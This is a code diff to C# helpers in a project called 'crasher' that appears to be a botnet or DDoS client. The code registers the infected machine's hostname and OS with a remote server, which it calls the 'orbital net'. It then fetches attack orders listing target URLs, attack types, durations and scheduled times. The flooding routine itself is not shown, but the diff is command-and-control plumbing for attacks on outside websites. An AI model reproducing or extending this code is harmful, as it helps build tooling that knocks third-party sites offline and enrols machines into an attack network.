@@ -22,8 +22,16 @@ namespace crasher.Helpers
             string os = Environment.OSVersion + " " + architecture;
 
             Uri uri = new Uri( ServerInfo.Server_Function_Path + "adduser.php?name=" + hostname + "&os=" + os);
-            var json = Client.DownloadString(uri);
-            return JArray.Parse(json);
+            try
+            {
+                var json = Client.DownloadString(uri);
+                return JArray.Parse(json);
+            }
+            catch(WebException ex)
+            {
+                throw new WebException("Cannot contact orbital net");
+            }
+            
         } 
 
         public static JArray LeftMRE()
@@ -33,22 +41,84 @@ namespace crasher.Helpers
             return JArray.Parse(json);
         }
 
-        public static bool CheckStatus(JArray json)
+        public static JArray GetUserAttacks()
+        {
+            var json = Client.DownloadString(ServerInfo.Server_Function_Path + "getuserattacks.php");
+            return JArray.Parse(json);
+        }
+
+        public static int GetTotUsers()
+        {
+            try
+            {
+                int users = Convert.ToInt32(Client.DownloadString(ServerInfo.Server_Function_Path + "getTotUser.php"));
+                return users;
+            }
+            catch
+            {
+                return -1;
+            }
+        }
+
+
+
+        public static List<IDictionary<string,object>> FormatUserAttacks()
+        {
+            JArray attacks = GetUserAttacks();
+            List<IDictionary<string, object>> attackList = new List<IDictionary<string, object>>();
+
+            IDictionary<string, object> dictionary;
+            for (int i = 0; i < attacks.Count; i++)
+            {
+                dictionary = new Dictionary<string, object>();
+                dictionary["id"] = GetJsonInt(attacks,"id", i);
+                dictionary["url"] = GetJsonString(attacks, "url", i);
+                dictionary["attackType"] = GetJsonString(attacks, "attackType", i);
+                dictionary["time"] = GetJsonInt(attacks, "time", i);
+                dictionary["planningEnabled"] = GetJsonBool(attacks, "planningEnabled", i);
+
+                if (Convert.ToBoolean(dictionary["planningEnabled"]))
+                {
+                    dictionary["planningDate"] = GetJsonString(attacks, "planningDate", i);
+                    dictionary["planningTime"] = GetJsonString(attacks, "planningTime", i);
+                }
+
+                attackList.Add(dictionary);
+            }
+
+            return attackList;
+        }
+
+        public static bool JsonGetStatus(JArray json)
         {
             var result = GetJsonString(json, "status", json.Count - 1);
             return result == "success" ? true : false;
         }
 
-        public static string GetMessage(JArray json)
+        public static string JsonGetMessage(JArray json)
         {
             var mess = GetJsonString(json, "message", json.Count - 1);
             return mess;
         }
 
-        public static string GetJsonString(JArray json, string dataIndex, int arrayIndex)
+
+
+        public static string GetJsonString(JArray json, string dataIndex,int arrayIndex)
         {
             var jsonString = json[arrayIndex][dataIndex];
             return jsonString.Value<string>();
+        }
+
+        public static int GetJsonInt(JArray json, string dataIndex, int arrayIndex)
+        {
+            var jsonString = json[arrayIndex][dataIndex];
+            return jsonString.Value<int>();
+        }
+
+        public static bool GetJsonBool(JArray json, string dataIndex, int arrayIndex)
+        {
+            var jsonString = json[arrayIndex][dataIndex];
+            return jsonString.Value<bool>();
         }
 
         //DATA TYPES NOT WORKING!!!!!!!!!!!!!!!!
@@ -57,5 +127,7 @@ namespace crasher.Helpers
             var jsonString = json[arrayIndex][dataIndex];
             return (T)Convert.ChangeType(jsonString.Value<int>(), typeof(T));
         }
+
+       
     }
 }
